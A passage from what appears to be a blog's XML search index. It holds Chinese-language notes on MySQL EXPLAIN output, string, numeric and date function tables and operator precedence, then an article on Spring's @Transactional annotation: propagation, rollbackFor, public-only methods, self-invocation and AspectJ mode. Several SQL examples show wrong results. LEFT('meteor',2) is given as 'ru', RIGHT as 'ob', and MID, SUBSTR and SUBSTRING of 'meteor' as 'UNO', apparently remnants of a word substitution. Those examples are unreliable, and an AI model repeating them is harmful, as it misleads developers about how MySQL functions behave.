	SELECT id FROM t_user_info WHERE id &#x3D; 1166
)




id
select_type
table
type
possible_keys
key
key_len
ref
rows
filtered
Extra



1
PRIMARY
t_user_info
ALL




616
100.00
Using where


2
DEPENDENT SUBQUERY
t_user_info
const
PRIMARY
PRIMARY
8
const
1
100.00
Using index


3
DEPENDENT UNION
t_user_info
const
PRIMARY
PRIMARY
8
const
1
100.00
Using index



UNION RESULT
&lt;union2,3&gt;
ALL






Using temporary


SUBQUERY
子查询中的第一个select其select_type为SUBQUERY

EXPLAIN 

SELECT * FROM t_user_info WHERE id &#x3D; (
	SELECT id FROM t_user_info WHERE id &#x3D; 1161
)




id
select_type
table
partitions
type
possible_keys
key
key_len
ref
rows
filtered
Extra



1
PRIMARY
t_user_info

const
PRIMARY
PRIMARY
8
const
1
100.00



2
SUBQUERY
t_user_info

const
PRIMARY
PRIMARY
8
const
1
100.00
Using index


DERIVED
当子查询是from子句时，其select_type为DERIVED。

EXPLAIN 

SELECT * FROM (
	SELECT id FROM t_user_info WHERE id &#x3D; 1161
) AS aliasName

type
注意:一般保证查询至少达到range级别，最好能达到ref。

system
该表只有一行（=系统表）。这是const联接类型的特例 。

const
通过索引一次就找到

eq_ref
唯一性索引扫描

ref
非唯一性索引扫描

unique_subquery
该联接类型用于替换value IN (SELECT primary_key FROM single_table WHERE some_expr)这样的子查询的ref。注意ref列，其中第二行显示的是func，表明unique_subquery是一个函数，而不是一个普通的ref。

index_subquery
该联接类型与上面的太像了，唯一的差别就是子查询查的不是主键而是非唯一索引。

range 只检索给定范围的行
按指定的范围进行检索，很常见。

index 只遍历索引树
在进行统计时非常常见，此联接类型实际上会扫描索引树，仅比ALL快些。

all 遍历全表
完整的扫描全表，最慢的联接类型，尽可能的避免。

函数字符串


函数
描述
实例



ASCII(s)
返回字符串 s 的第一个字符的 ASCII 码。
返回 CustomerName 字段第一个字母的 ASCII 码：SELECT ASCII(CustomerName) AS NumCodeOfFirstChar FROM Customers;


CHAR_LENGTH(s)
返回字符串 s 的字符数
返回字符串 meteor 的字符数SELECT CHAR_LENGTH(&quot;meteor&quot;) AS LengthOfString;


CHARACTER_LENGTH(s)
返回字符串 s 的字符数
返回字符串 meteor 的字符数SELECT CHARACTER_LENGTH(&quot;meteor&quot;) AS LengthOfString;


CONCAT(s1,s2...sn)
字符串 s1,s2 等多个字符串合并为一个字符串
合并多个字符串SELECT CONCAT(&quot;SQL &quot;, &quot;meteor &quot;, &quot;Gooogle &quot;, &quot;Facebook&quot;) AS ConcatenatedString;


CONCAT_WS(x, s1,s2...sn)
同 CONCAT(s1,s2,...) 函数，但是每个字符串之间要加上 x，x 可以是分隔符
合并多个字符串，并添加分隔符：SELECT CONCAT_WS(&quot;-&quot;, &quot;SQL&quot;, &quot;Tutorial&quot;, &quot;is&quot;, &quot;fun!&quot;)AS ConcatenatedString;


FIELD(s,s1,s2...)
返回第一个字符串 s 在字符串列表(s1,s2...)中的位置
返回字符串 c 在列表值中的位置：SELECT FIELD(&quot;c&quot;, &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;);


FIND_IN_SET(s1,s2)
返回在字符串s2中与s1匹配的字符串的位置
返回字符串 c 在指定字符串中的位置：SELECT FIND_IN_SET(&quot;c&quot;, &quot;a,b,c,d,e&quot;);


FORMAT(x,n)
函数可以将数字 x 进行格式化 &quot;#,###.##&quot;, 将 x 保留到小数点后 n 位，最后一位四舍五入。
格式化数字 &quot;#,###.##&quot; 形式：SELECT FORMAT(250500.5634, 2);     -- 输出 250,500.56


INSERT(s1,x,len,s2)
字符串 s2 替换 s1 的 x 位置开始长度为 len 的字符串
从字符串第一个位置开始的 6 个字符替换为 meteor：SELECT INSERT(&quot;baidu.com&quot;, 1, 6, &quot;meteor&quot;);  -- 输出：meteor.com


LOCATE(s1,s)
从字符串 s 中获取 s1 的开始位置
获取 b 在字符串 abc 中的位置：SELECT LOCATE(&#39;st&#39;,&#39;myteststring&#39;);  -- 5返回字符串 abc 中 b 的位置：SELECT LOCATE(&#39;b&#39;, &#39;abc&#39;) -- 2


LCASE(s)
将字符串 s 的所有字母变成小写字母
字符串 meteor 转换为小写：SELECT LCASE(&#39;meteor&#39;) -- meteor


LEFT(s,n)
返回字符串 s 的前 n 个字符
返回字符串 meteor 中的前两个字符：SELECT LEFT(&#39;meteor&#39;,2) -- ru


LOWER(s)
将字符串 s 的所有字母变成小写字母
字符串 meteor 转换为小写：SELECT LOWER(&#39;meteor&#39;) -- meteor


LPAD(s1,len,s2)
在字符串 s1 的开始处填充字符串 s2，使字符串长度达到 len
将字符串 xx 填充到 abc 字符串的开始处：SELECT LPAD(&#39;abc&#39;,5,&#39;xx&#39;) -- xxabc


LTRIM(s)
去掉字符串 s 开始处的空格
去掉字符串 meteor开始处的空格：SELECT LTRIM(&quot;    meteor&quot;) AS LeftTrimmedString;-- meteor


MID(s,n,len)
从字符串 s 的 n 位置截取长度为 len 的子字符串，同 SUBSTRING(s,n,len)
从字符串 meteor 中的第 2 个位置截取 3个 字符：SELECT MID(&quot;meteor&quot;, 2, 3) AS ExtractString; -- UNO


POSITION(s1 IN s)
从字符串 s 中获取 s1 的开始位置
返回字符串 abc 中 b 的位置：SELECT POSITION(&#39;b&#39; in &#39;abc&#39;) -- 2


REPEAT(s,n)
将字符串 s 重复 n 次
将字符串 meteor 重复三次：SELECT REPEAT(&#39;meteor&#39;,3) -- meteormeteormeteor


REPLACE(s,s1,s2)
将字符串 s2 替代字符串 s 中的字符串 s1
将字符串 abc 中的字符 a 替换为字符 x：SELECT REPLACE(&#39;abc&#39;,&#39;a&#39;,&#39;x&#39;) --xbc


REVERSE(s)
将字符串s的顺序反过来
将字符串 abc 的顺序反过来：SELECT REVERSE(&#39;abc&#39;) -- cba


RIGHT(s,n)
返回字符串 s 的后 n 个字符
返回字符串 meteor 的后两个字符：SELECT RIGHT(&#39;meteor&#39;,2) -- ob


RPAD(s1,len,s2)
在字符串 s1 的结尾处添加字符串 s2，使字符串的长度达到 len
将字符串 xx 填充到 abc 字符串的结尾处：SELECT RPAD(&#39;abc&#39;,5,&#39;xx&#39;) -- abcxx


RTRIM(s)
去掉字符串 s 结尾处的空格
去掉字符串 meteor 的末尾空格：SELECT RTRIM(&quot;meteor     &quot;) AS RightTrimmedString;   -- meteor


SPACE(n)
返回 n 个空格
返回 10 个空格：SELECT SPACE(10);


STRCMP(s1,s2)
比较字符串 s1 和 s2，如果 s1 与 s2 相等返回 0 ，如果 s1&gt;s2 返回 1，如果 s1&lt;s2 返回 -1
比较字符串：SELECT STRCMP(&quot;meteor&quot;, &quot;meteor&quot;);  -- 0


SUBSTR(s, start, length)
从字符串 s 的 start 位置截取长度为 length 的子字符串
从字符串 meteor 中的第 2 个位置截取 3个 字符：SELECT SUBSTR(&quot;meteor&quot;, 2, 3) AS ExtractString; -- UNO


SUBSTRING(s, start, length)
从字符串 s 的 start 位置截取长度为 length 的子字符串
从字符串 meteor 中的第 2 个位置截取 3个 字符：SELECT SUBSTRING(&quot;meteor&quot;, 2, 3) AS ExtractString; -- UNO


SUBSTRING_INDEX(s, delimiter, number)
返回从字符串 s 的第 number 个出现的分隔符 delimiter 之后的子串。 如果 number 是正数，返回第 number 个字符左边的字符串。 如果 number 是负数，返回第(number 的绝对值(从右边数))个字符右边的字符串。
SELECT SUBSTRING_INDEX(&#39;a*b&#39;,&#39;*&#39;,1) -- a SELECT SUBSTRING_INDEX(&#39;a*b&#39;,&#39;*&#39;,-1)  -- b SELECT SUBSTRING_INDEX(SUBSTRING_INDEX(&#39;a*b*c*d*e&#39;,&#39;*&#39;,3),&#39;*&#39;,-1)  -- c


TRIM(s)
去掉字符串 s 开始和结尾处的空格
去掉字符串 meteor 的首尾空格：SELECT TRIM(&#39;    meteor    &#39;) AS TrimmedString;


UCASE(s)
将字符串转换为大写
将字符串 meteor 转换为大写：SELECT UCASE(&quot;meteor&quot;); -- METEOR


UPPER(s)
将字符串转换为大写
将字符串 meteor 转换为大写：SELECT UPPER(&quot;meteor&quot;); -- METEOR


数值


函数名
描述
实例



ABS(x)
返回 x 的绝对值
返回 -1 的绝对值：SELECT ABS(-1) -- 返回1


ACOS(x)
求 x 的反余弦值(参数是弧度)
SELECT ACOS(0.25);


ASIN(x)
求反正弦值(参数是弧度)
SELECT ASIN(0.25);


ATAN(x)
求反正切值(参数是弧度)
SELECT ATAN(2.5);


ATAN2(n, m)
求反正切值(参数是弧度)
SELECT ATAN2(-0.8, 2);


AVG(expression)
返回一个表达式的平均值，expression 是一个字段
返回 Products 表中Price 字段的平均值：SELECT AVG(Price) AS AveragePrice FROM Products;


CEIL(x)
返回大于或等于 x 的最小整数
SELECT CEIL(1.5) -- 返回2


CEILING(x)
返回大于或等于 x 的最小整数
SELECT CEILING(1.5); -- 返回2


COS(x)
求余弦值(参数是弧度)
SELECT COS(2);


COT(x)
求余切值(参数是弧度)
SELECT COT(6);


COUNT(expression)
返回查询的记录总数，expression 参数是一个字段或者 * 号
返回 Products 表中 products 字段总共有多少条记录：SELECT COUNT(ProductID) AS NumberOfProducts FROM Products;


DEGREES(x)
将弧度转换为角度
SELECT DEGREES(3.1415926535898) -- 180


n DIV m
整除，n 为被除数，m 为除数
计算 10 除于 5：SELECT 10 DIV 5;  -- 2


EXP(x)
返回 e 的 x 次方
计算 e 的三次方：SELECT EXP(3) -- 20.085536923188


FLOOR(x)
返回小于或等于 x 的最大整数
小于或等于 1.5 的整数：SELECT FLOOR(1.5) -- 返回1


GREATEST(expr1, expr2, expr3, ...)
返回列表中的最大值
返回以下数字列表中的最大值：SELECT GREATEST(3, 12, 34, 8, 25); -- 34返回以下字符串列表中的最大值：SELECT GREATEST(&quot;Google&quot;, &quot;Runoob&quot;, &quot;Apple&quot;);   -- Runoob


LEAST(expr1, expr2, expr3, ...)
返回列表中的最小值
返回以下数字列表中的最小值：SELECT LEAST(3, 12, 34, 8, 25); -- 3返回以下字符串列表中的最小值：SELECT LEAST(&quot;Google&quot;, &quot;Runoob&quot;, &quot;Apple&quot;);   -- Apple


LN
返回数字的自然对数，以 e 为底。
返回 2 的自然对数：SELECT LN(2);  -- 0.6931471805599453


LOG(x) 或 LOG(base, x)
返回自然对数(以 e 为底的对数)，如果带有 base 参数，则 base 为指定带底数。
SELECT LOG(20.085536923188) -- 3 SELECT LOG(2, 4); -- 2


LOG10(x)
返回以 10 为底的对数
SELECT LOG10(100) -- 2


LOG2(x)
返回以 2 为底的对数
返回以 2 为底 6 的对数：SELECT LOG2(6);  -- 2.584962500721156


MAX(expression)
返回字段 expression 中的最大值
返回数据表 Products 中字段 Price 的最大值：SELECT MAX(Price) AS LargestPrice FROM Products;


MIN(expression)
返回字段 expression 中的最小值
返回数据表 Products 中字段 Price 的最小值：SELECT MIN(Price) AS MinPrice FROM Products;


MOD(x,y)
返回 x 除以 y 以后的余数
5 除于 2 的余数：SELECT MOD(5,2) -- 1


PI()
返回圆周率(3.141593）
SELECT PI() --3.141593


POW(x,y)
返回 x 的 y 次方
2 的 3 次方：SELECT POW(2,3) -- 8


POWER(x,y)
返回 x 的 y 次方
2 的 3 次方：SELECT POWER(2,3) -- 8


RADIANS(x)
将角度转换为弧度
180 度转换为弧度：SELECT RADIANS(180) -- 3.1415926535898


RAND()
返回 0 到 1 的随机数
SELECT RAND() --0.93099315644334


ROUND(x)
返回离 x 最近的整数
SELECT ROUND(1.23456) --1


SIGN(x)
返回 x 的符号，x 是负数、0、正数分别返回 -1、0 和 1
SELECT SIGN(-10) -- (-1)


SIN(x)
求正弦值(参数是弧度)
SELECT SIN(RADIANS(30)) -- 0.5


SQRT(x)
返回x的平方根
25 的平方根：SELECT SQRT(25) -- 5


SUM(expression)
返回指定字段的总和
计算 OrderDetails 表中字段 Quantity 的总和：SELECT SUM(Quantity) AS TotalItemsOrdered FROM OrderDetails;


TAN(x)
求正切值(参数是弧度)
SELECT TAN(1.75);  -- -5.52037992250933


TRUNCATE(x,y)
返回数值 x 保留到小数点后 y 位的值（与 ROUND 最大的区别是不会进行四舍五入）
SELECT TRUNCATE(1.23456,3) -- 1.234


日期


函数名
描述
实例



ADDDATE(d,n)
计算起始日期 d 加上 n 天的日期
SELECT ADDDATE(&quot;2017-06-15&quot;, INTERVAL 10 DAY); -&gt;2017-06-25


ADDTIME(t,n)
n 是一个时间表达式，时间 t 加上时间表达式 n
加 5 秒：SELECT ADDTIME(&#39;2011-11-11 11:11:11&#39;, 5); -&gt;2011-11-11 11:11:16 (秒)添加 2 小时, 10 分钟, 5 秒: SELECT ADDTIME(&quot;2020-06-15 09:34:21&quot;, &quot;2:10:5&quot;);  -&gt; 2020-06-15 11:44:26


CURDATE()
返回当前日期
SELECT CURDATE(); -&gt; 2020-12-23


CURRENT_DATE()
返回当前日期
SELECT CURRENT_DATE(); -&gt; 2020-12-23


CURRENT_TIME
返回当前时间
SELECT CURRENT_TIME(); -&gt; 19:59:02


CURRENT_TIMESTAMP()
返回当前日期和时间
SELECT CURRENT_TIMESTAMP() -&gt; 2018-12-23 20:57:43


CURTIME()
返回当前时间
SELECT CURTIME(); -&gt; 19:59:02


DATE()
从日期或日期时间表达式中提取日期值
SELECT DATE(&quot;2017-06-15&quot;);     -&gt; 2017-06-15


DATEDIFF(d1,d2)
计算日期 d1-&gt;d2 之间相隔的天数
SELECT DATEDIFF(&#39;2001-01-01&#39;,&#39;2001-02-02&#39;) -&gt; -32


DATE_ADD(d，INTERVAL expr type)
计算起始日期 d 加上一个时间段后的日期
SELECT ADDDATE(&#39;2011-11-11 11:11:11&#39;,1) -&gt; 2011-11-12 11:11:11  (默认是天) SELECT ADDDATE(&#39;2011-11-11 11:11:11&#39;, INTERVAL 5 MINUTE) -&gt; 2011-11-11 11:16:11 (TYPE的取值与上面那个列出来的函数类似)


DATE_FORMAT(d,f)
按表达式 f的要求显示日期 d
SELECT DATE_FORMAT(&#39;2011-11-11 11:11:11&#39;,&#39;%Y-%m-%d %r&#39;) -&gt; 2011-11-11 11:11:11 AM


DATE_SUB(date,INTERVAL expr type)
函数从日期减去指定的时间间隔。
Orders 表中 OrderDate 字段减去 2 天：SELECT OrderId,DATE_SUB(OrderDate,INTERVAL 2 DAY) AS OrderPayDate FROM Orders


DAY(d)
返回日期值 d 的日期部分
SELECT DAY(&quot;2017-06-15&quot;);   -&gt; 15


DAYNAME(d)
返回日期 d 是星期几，如 Monday,Tuesday
SELECT DAYNAME(&#39;2011-11-11 11:11:11&#39;) -&gt;Friday


DAYOFMONTH(d)
计算日期 d 是本月的第几天
SELECT DAYOFMONTH(&#39;2011-11-11 11:11:11&#39;) -&gt;11


DAYOFWEEK(d)
日期 d 今天是星期几，1 星期日，2 星期一，以此类推
SELECT DAYOFWEEK(&#39;2011-11-11 11:11:11&#39;) -&gt;6


DAYOFYEAR(d)
计算日期 d 是本年的第几天
SELECT DAYOFYEAR(&#39;2011-11-11 11:11:11&#39;) -&gt;315


EXTRACT(type FROM d)
从日期 d 中获取指定的值，type 指定返回的值。type可取值为： - MICROSECOND- SECOND- MINUTE- HOUR- DAY- WEEK- MONTH- QUARTER- YEAR- SECOND_MICROSECOND- MINUTE_MICROSECOND- MINUTE_SECOND- HOUR_MICROSECOND- HOUR_SECOND- HOUR_MINUTE- DAY_MICROSECOND- DAY_SECOND- DAY_MINUTE- DAY_HOUR- YEAR_MONTH
SELECT EXTRACT(MINUTE FROM &#39;2011-11-11 11:11:11&#39;)  -&gt; 11


FROM_DAYS(n)
计算从 0000 年 1 月 1 日开始 n 天后的日期
SELECT FROM_DAYS(1111) -&gt; 0003-01-16


HOUR(t)
返回 t 中的小时值
SELECT HOUR(&#39;1:2:3&#39;) -&gt; 1


LAST_DAY(d)
返回给给定日期的那一月份的最后一天
SELECT LAST_DAY(&quot;2017-06-20&quot;); -&gt; 2017-06-30


LOCALTIME()
返回当前日期和时间
SELECT LOCALTIME() -&gt; 2018-12-23 20:57:43


LOCALTIMESTAMP()
返回当前日期和时间
SELECT LOCALTIMESTAMP() -&gt; 2018-12-23 20:57:43


MAKEDATE(year, day-of-year)
基于给定参数年份 year 和所在年中的天数序号 day-of-year 返回一个日期
SELECT MAKEDATE(2017, 3); -&gt; 2017-01-03


MAKETIME(hour, minute, second)
组合时间，参数分别为小时、分钟、秒
SELECT MAKETIME(11, 35, 4); -&gt; 11:35:04


MICROSECOND(date)
返回日期参数所对应的微秒数
SELECT MICROSECOND(&quot;2017-06-20 09:34:00.000023&quot;); -&gt; 23


MINUTE(t)
返回 t 中的分钟值
SELECT MINUTE(&#39;1:2:3&#39;) -&gt; 2


MONTHNAME(d)
返回日期当中的月份名称，如 November
SELECT MONTHNAME(&#39;2011-11-11 11:11:11&#39;) -&gt; November


MONTH(d)
返回日期d中的月份值，1 到 12
SELECT MONTH(&#39;2011-11-11 11:11:11&#39;) -&gt;11


NOW()
返回当前日期和时间
SELECT NOW() -&gt; 2018-12-23 20:57:43


PERIOD_ADD(period, number)
为 年-月 组合日期添加一个时段
SELECT PERIOD_ADD(201703, 5);    -&gt; 201708


PERIOD_DIFF(period1, period2)
返回两个时段之间的月份差值
SELECT PERIOD_DIFF(201710, 201703); -&gt; 7


QUARTER(d)
返回日期d是第几季节，返回 1 到 4
SELECT QUARTER(&#39;2011-11-11 11:11:11&#39;) -&gt; 4


SECOND(t)
返回 t 中的秒钟值
SELECT SECOND(&#39;1:2:3&#39;) -&gt; 3


SEC_TO_TIME(s)
将以秒为单位的时间 s 转换为时分秒的格式
SELECT SEC_TO_TIME(4320) -&gt; 01:12:00


STR_TO_DATE(string, format_mask)
将字符串转变为日期
SELECT STR_TO_DATE(&quot;August 10 2017&quot;, &quot;%M %d %Y&quot;); -&gt; 2017-08-10


SUBDATE(d,n)
日期 d 减去 n 天后的日期
SELECT SUBDATE(&#39;2011-11-11 11:11:11&#39;, 1) -&gt;2011-11-10 11:11:11 (默认是天)


SUBTIME(t,n)
时间 t 减去 n 秒的时间
SELECT SUBTIME(&#39;2011-11-11 11:11:11&#39;, 5) -&gt;2011-11-11 11:11:06 (秒)


SYSDATE()
返回当前日期和时间
SELECT SYSDATE() -&gt; 2018-12-23 20:57:43


TIME(expression)
提取传入表达式的时间部分
SELECT TIME(&quot;19:30:10&quot;); -&gt; 19:30:10


TIME_FORMAT(t,f)
按表达式 f 的要求显示时间 t
SELECT TIME_FORMAT(&#39;11:11:11&#39;,&#39;%r&#39;) 11:11:11 AM


TIME_TO_SEC(t)
将时间 t 转换为秒
SELECT TIME_TO_SEC(&#39;1:12:00&#39;) -&gt; 4320


TIMEDIFF(time1, time2)
计算时间差值
SELECT TIMEDIFF(&quot;13:10:11&quot;, &quot;13:10:10&quot;); -&gt; 00:00:01


TIMESTAMP(expression, interval)
单个参数时，函数返回日期或日期时间表达式；有2个参数时，将参数加和
SELECT TIMESTAMP(&quot;2017-07-23&quot;,  &quot;13:10:11&quot;); -&gt; 2017-07-23 13:10:11


TO_DAYS(d)
计算日期 d 距离 0000 年 1 月 1 日的天数
SELECT TO_DAYS(&#39;0001-01-01 01:01:01&#39;) -&gt; 366


WEEK(d)
计算日期 d 是本年的第几个星期，范围是 0 到 53
SELECT WEEK(&#39;2011-11-11 11:11:11&#39;) -&gt; 45


WEEKDAY(d)
日期 d 是星期几，0 表示星期一，1 表示星期二
SELECT WEEKDAY(&quot;2017-06-15&quot;); -&gt; 3


WEEKOFYEAR(d)
计算日期 d 是本年的第几个星期，范围是 0 到 53
SELECT WEEKOFYEAR(&#39;2011-11-11 11:11:11&#39;) -&gt; 45


YEAR(d)
返回年份
SELECT YEAR(&quot;2017-06-15&quot;); -&gt; 2017


YEARWEEK(date, mode)
返回年份及第几周（0到53），mode 中 0 表示周天，1表示周一，以此类推
SELECT YEARWEEK(&quot;2017-06-15&quot;); -&gt; 201724


运算符算数运算符


运算符
作用



+
加法


-
减法


*
乘法


/ 或 DIV
除法


% 或 MOD
取余


比较运算符








符号
描述
备注


=
等于



&lt;&gt;, !=
不等于



&gt;
大于



&lt;
小于



&lt;=
小于等于



&gt;=
大于等于



BETWEEN
在两值之间
&gt;=min&amp;&amp;&lt;=max


NOT BETWEEN
不在两值之间



IN
在集合中



NOT IN
不在集合中



&lt;=&gt;
严格比较两个NULL值是否相等
两个操作码均为NULL时，其所得值为1；而当一个操作码为NULL时，其所得值为0


LIKE
模糊匹配



REGEXP 或 RLIKE
正则式匹配



IS NULL
为空



IS NOT NULL
不为空



逻辑运算符


运算符号
作用



NOT 或 !
逻辑非


AND
逻辑与


OR
逻辑或


XOR
逻辑异或


位运算符


运算符号
作用



&amp;
按位与


|
按位或


^
按位异或


!
取反


&lt;&lt;
左移


&gt;&gt;
右移


优先级最低优先级为： **:=**。
最高优先级为： !、BINARY、 COLLATE。



优先级顺序
运算符



1
:=


2
|| , OR , XOR


3
&amp;&amp; , AND


4
NOT


5
BETWEEN , CASE , WHEN , THEN , ELSE


6
= , &lt;=&gt; , &gt;= , &gt; , &lt;= , &lt; , &lt;&gt; , != , IS , LIKE, REGEXP , IN


7
|


8
&amp;


9
&lt;&lt; , &gt;&gt;


10
- , +


11
*, / , DIV , % , MOD


12
^


13
-（一元减号） , ~（一元比特反转）


14
!


]]></content>
      <tags>
        <tag>MySQL</tag>
        <tag>基础语法</tag>
      </tags>
  </entry>
  <entry>
    <title>透彻的掌握Spring中@transactional的使用</title>
    <url>/2021/03/12/%E9%80%8F%E5%BD%BB%E7%9A%84%E6%8E%8C%E6%8F%A1Spring%E4%B8%AD-transactional%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[事务管理是应用系统开发中必不可少的一部分。Spring 为事务管理提供了丰富的功能支持。Spring 事务管理分为编码式和声明式的两种方式。编程式事务指的是通过编码方式实现事务；声明式事务基于 AOP, 将具体业务逻辑与事务处理解耦。声明式事务管理使业务代码逻辑不受污染, 因此在实际使用中声明式事务用的比较多。声明式事务有两种方式，一种是在配置文件（XML）中做相关的事务规则声明，另一种是基于 @Transactional 注解的方式。注释配置是目前流行的使用方式，因此本文将着重介绍基于 @Transactional 注解的事务管理。


@Transactional 注解管理事务的实现步骤使用 @Transactional 注解管理事务的实现步骤分为两步。
第一步，在 XML 配置文件中添加如清单 1 的事务配置信息。除了用配置文件的方式，@EnableTransactionManagement 注解也可以启用事务管理功能。这里以简单的 DataSourceTransactionManager 为例。
清单 1. 在 XML配置中的事务配置信息&lt;tx:annotation-driven &#x2F;&gt;

&lt;bean id&#x3D;&quot;transactionManager&quot;
      class&#x3D;&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt;&lt;&#x2F;bean&gt;

第二步，将 @Transactional 注解添加到合适的方法上，并设置合适的属性信息。@Transactional 注解的属性信息如表 1 展示。
 表 1. @Transactional 注解的属性信息
属性名说明name当在配置文件中有多个 TransactionManager , 可以用该属性指定选择哪个事务管理器。propagation事务的传播行为，默认值为 REQUIRED。isolation事务的隔离度，默认值采用 DEFAULT。timeout事务的超时时间，默认值为 - 1。如果超过该时间限制但事务还没有完成，则自动回滚事务。read-only指定事务是否为只读事务，默认值为 false；为了忽略那些不需要事务的方法，比如读取数据，可以设置 read-only 为 true。rollback-for用于指定能够触发事务回滚的异常类型，如果有多个异常类型需要指定，各类型之间可以通过逗号分隔。no-rollback- for抛出 no-rollback-for 指定的异常类型，不回滚事务。



除此以外，@Transactional 注解也可以添加到类级别上。当把 @Transactional 注解放在类级别时，表示所有该类的公共方法都配置相同的事务属性信息。
见清单2，EmployeeService 的所有方法都支持事务并且是只读。
当类级别配置了 @Transactional，方法级别也配置了 @Transactional，应用程序会以方法级别的事务属性信息来管理事务，换言之，方法级别的事务属性信息会覆盖类级别的相关配置信息。
清单 2. @Transactional 注解的类级别支持@Transactional(propagation&#x3D; Propagation.SUPPORTS,readOnly&#x3D;true)
@Service(value &#x3D;&quot;employeeService&quot;)
public class EmployeeService

到此，您会发觉使用 @Transactional 注解管理事务的实现步骤很简单。
但是如果对 Spring 中的 @transaction 注解的事务管理理解的不够透彻，就很容易出现错误，比如事务应该回滚（rollback）而没有回滚事务的问题。
接下来，将首先分析 Spring 的注解方式的事务实现机制，然后列出相关的注意事项，以最终达到帮助开发人员准确而熟练的使用 Spring 的事务的目的。
Spring 的注解方式的事务实现机制在应用系统调用声明 @Transactional 的目标方法时，Spring Framework 默认使用 AOP 代理，在代码运行时生成一个代理对象，根据 @Transactional 的属性配置信息，这个代理对象决定该声明 @Transactional 的目标方法是否由拦截器 TransactionInterceptor 来使用拦截，在 TransactionInterceptor 拦截时，会在在目标方法开始执行之前创建并加入事务，并执行目标方法的逻辑, 最后根据执行情况是否出现异常，利用抽象事务管理器 (图 2 有相关介绍)AbstractPlatformTransactionManager 操作数据源 DataSource 提交或回滚事务, 如图 1 所示。
 图 1. Spring 事务实现机制

Spring AOP 代理有 CglibAopProxy 和 JdkDynamicAopProxy 两种，图 1 是以 CglibAopProxy 为例，对于 CglibAopProxy，需要调用其内部类的 DynamicAdvisedInterceptor的 intercept 方法。对于 JdkDynamicAopProxy，需要调用其 invoke 方法。
正如上文提到的，事务管理的框架是由抽象事务管理器 AbstractPlatformTransactionManager 来提供的，而具体的底层事务处理实现，由 PlatformTransactionManager 的具体实现类来实现，如事务管理器 DataSourceTransactionManager。
不同的事务管理器管理不同的数据资源 DataSource，比如 DataSourceTransactionManager 管理 JDBC 的 Connection。
PlatformTransactionManager，AbstractPlatformTransactionManager 及具体实现类关系如图 2 所示。
 图 2. TransactionManager 类结构

注解方式的事务使用注意事项
当您对 Spring 的基于注解方式的实现步骤和事务内在实现机制有较好的理解之后，就会更好的使用注解方式的事务管理，避免当系统抛出异常，数据不能回滚的问题。
正确的设置 @Transactional 的 propagation 属性
需要注意下面三种 propagation 可以不启动事务。本来期望目标方法进行事务管理，但若是错误的配置这三种 propagation，事务将不会发生回滚。

 TransactionDefinition.PROPAGATION_SUPPORTS：如果当前存在事务，则加入该事务；如果当前没有事务，则以非事务的方式继续运行。
 TransactionDefinition.PROPAGATION_NOT_SUPPORTED：以非事务方式运行，如果当前存在事务，则把当前事务挂起。
 TransactionDefinition.PROPAGATION_NEVER：以非事务方式运行，如果当前存在事务，则抛出异常。

正确的设置 @Transactional 的 rollbackFor 属性
默认情况下，如果在事务中抛出了未检查异常（继承自 RuntimeException 的异常）或者 Error，则 Spring 将回滚事务；除此之外，Spring 不会回滚事务。
如果在事务中抛出其他类型的异常，并期望 Spring 能够回滚事务，可以指定 rollbackFor。例：
@Transactional(propagation= Propagation.REQUIRED,rollbackFor= MyException.class)
通过分析 Spring 源码可以知道，若在目标方法中抛出的异常是 rollbackFor 指定的异常的子类，事务同样会回滚。
清单 3. RollbackRuleAttribute 的 getDepth 方法private int getDepth(Class&lt;?&gt; exceptionClass, int depth) &#123;
    if (exceptionClass.getName().contains(this.exceptionName)) &#123;
        &#x2F;&#x2F; Found it!
        return depth;
    &#125;
    &#x2F;&#x2F; If we&#39;ve gone as far as we can go and haven&#39;t found it...
    if (exceptionClass &#x3D;&#x3D; Throwable.class) &#123;
    	return -1;
    &#125;
	return getDepth(exceptionClass.getSuperclass(), depth + 1);
&#125;

@Transactional 只能应用到 public 方法才有效
只有 @Transactional 注解应用到 public 方法，才能进行事务管理。这是因为在使用 Spring AOP 代理时，Spring 在调用在图 1 中的 TransactionInterceptor 在目标方法执行前后进行拦截之前，DynamicAdvisedInterceptor（CglibAopProxy 的内部类）的的 intercept 方法或 JdkDynamicAopProxy 的 invoke 方法会间接调用 AbstractFallbackTransactionAttributeSource（Spring 通过这个类获取表 1. @Transactional 注解的事务属性配置属性信息）的 computeTransactionAttribute 方法。
清单 4. AbstractFallbackTransactionAttributeSourceprotected TransactionAttribute computeTransactionAttribute(Method method, Class&lt;?&gt; targetClass) &#123;
    &#x2F;&#x2F; Don&#39;t allow no-public methods as required.
    if (allowPublicMethodsOnly() &amp;&amp; !Modifier.isPublic(method.getModifiers())) &#123;
        return null;
    &#125;
    ...
&#125;

这个方法会检查目标方法的修饰符是不是 public，若不是 public，就不会获取 @Transactional 的属性配置信息，最终会造成不会用 TransactionInterceptor 来拦截该目标方法进行事务管理。
避免 Spring 的 AOP 的自调用问题
在 Spring 的 AOP 代理下，只有目标方法由外部调用，目标方法才由 Spring 生成的代理对象来管理，这会造成自调用问题。若同一类中的其他没有 @Transactional 注解的方法内部调用有 @Transactional 注解的方法，有 @Transactional 注解的方法的事务被忽略，不会发生回滚。见清单 5 举例代码展示。
清单 5. 自调用问题举例@Service
public class OrderService &#123;
    private void insert() &#123;
    	insertOrder();
    &#125;
	@Transactional
    public void insertOrder() &#123;
        &#x2F;&#x2F;insert log info
        &#x2F;&#x2F;insertOrder
        &#x2F;&#x2F;updateAccount
    &#125;
&#125;

insertOrder 尽管有 @Transactional 注解，但它被内部方法 insert 调用，事务被忽略，出现异常事务不会发生回滚。
上面的两个问题 @Transactional 注解只应用到 public 方法和自调用问题，是由于使用 Spring AOP 代理造成的。为解决这两个问题，使用 AspectJ 取代 Spring AOP 代理。
需要将下面的 AspectJ 信息添加到 XML 配置信息中。
清单 6. AspectJ 的 XML 配置信息&lt;tx:annotation-driven mode&#x3D;&quot;aspectj&quot; &#x2F;&gt;

&lt;bean id&#x3D;&quot;transactionManager&quot; 
      class&#x3D;&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&gt;&lt;&#x2F;bean&gt;

&lt;bean class&#x3D;&quot;org.springframework.transaction.aspectj.AnnotationTransactionAspect&quot; 
      factory-method&#x3D;&quot;aspectOf&quot;&gt;&lt;&#x2F;bean&gt;

同时在 Maven 的 pom 文件中加入 spring-aspects 和 aspectjrt 的 dependency 以及 aspectj-maven-plugin。
